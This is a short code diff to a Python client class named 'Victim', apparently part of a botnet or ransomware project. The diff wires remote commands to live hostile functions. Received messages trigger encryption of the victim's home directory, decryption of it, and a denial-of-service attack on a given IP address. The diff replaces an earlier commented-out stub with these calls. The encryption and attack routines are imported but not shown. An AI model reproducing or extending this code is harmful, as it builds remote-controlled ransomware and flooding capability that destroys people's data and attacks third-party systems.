@@ -6,6 +6,8 @@ import zipfile
 from messenger import *
 from os.path import expanduser
 from time import sleep
+from encryption import *
+from dos import *
 
 PORT = 3838
 VICTIM_LISTEN_PORT = 4848
@@ -33,6 +35,7 @@ class Victim(object):
 
     def process_decrypt_files(self, msg):
         print "Decrypting files..."
+        decrypt_home(msg[0])
         return
 
     def process_dos_attack(self, msg):
@@ -40,14 +43,11 @@ class Victim(object):
         # "IP"
         # Sleep for 0.1 since it will drop the majority of packets
         print "Target for dos attack %s" % str(msg[0])
-        '''target_ip = str(msg[0])
-        for i in range(2):
-            sleep(1)
-            Messenger.send_message(target_ip, PORT, "DOS")'''
+        dos(msg[0])
 
     def process_encrypt_files(self, msg):
         print "Encrypting files..."
-        # Calls encrypt.py
+        encrypt_home(msg[0])
         pass
 
     def process_new_victim(self, msg):
